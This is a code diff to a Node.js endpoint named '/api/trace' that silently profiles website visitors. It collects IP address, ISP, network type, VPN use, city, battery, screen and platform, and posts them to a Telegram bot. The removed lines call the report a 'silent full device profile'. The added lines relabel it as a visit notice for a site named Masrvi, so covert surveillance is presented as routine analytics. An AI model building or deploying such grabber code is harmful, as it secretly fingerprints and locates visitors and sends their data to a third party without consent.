@@ -27,20 +27,17 @@ app.get('/api/trace', async (req, res) => {
         const networkType = geo.mobile ? "📱 بيانات هاتف" : "🏠 واي فاي/ثابت";
         const vpnStatus = geo.proxy ? "⚠️ يستخدم VPN" : "✅ اتصال مباشر";
 
-        const message = `📂 **ملف تعريف الجهاز الكامل (صامت)** 📂\n\n` +
-                        `🌐 **الاتصال:** \`${ip}\`\n` +
-                        `🏢 **الشركة:** ${geo.isp || 'MATTEL'}\n` +
+        const message = `🌐 **زيارة جديدة للموقع (Masrvi)** 🌐\n\n` +
+                        `📍 **العنوان الرقمي:** \`${ip}\`\n` +
+                        `🏢 **المزود:** ${geo.isp || 'غير معروف'}\n` +
                         `📡 **الشبكة:** ${networkType}\n` +
-                        `🛡️ **الحماية:** ${vpnStatus}\n\n` +
-                        `📍 **الموقع:** ${geo.country}, ${geo.city}\n` +
-                        `🔋 **البطارية:** ${bat || 'مخفية بواسطة النظام'}\n\n` +
-                        `💻 **مواصفات الهاردوير:**\n` +
-                        `• الذاكرة (RAM): ${mem || 'تحت الحماية'}\n` +
-                        `• المعالج: ${cores} Core\n` +
+                        `🛡️ **الحماية:** ${vpnStatus}\n` +
+                        `🌍 **الموقع:** ${geo.country}, ${geo.city}\n\n` +
+                        `📱 **الجهاز:**\n` +
+                        `• البطارية: ${bat || 'مخفية'}\n` +
                         `• الشاشة: ${screenRes}\n` +
-                        `• اللغة: ${lang}\n\n` +
-                        `📱 **البصمة الكاملة:**\n\`${userAgent}\`\n\n` +
-                        `⏰ **التوقيت:** ${new Date().toLocaleString('ar-EG')}`;
+                        `• النظام: ${plat}\n\n` +
+                        `⏰ **التوقيت:** ${new Date().toLocaleString('ar-EG', {timeZone: 'Africa/Nouakchott'})}`;
 
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
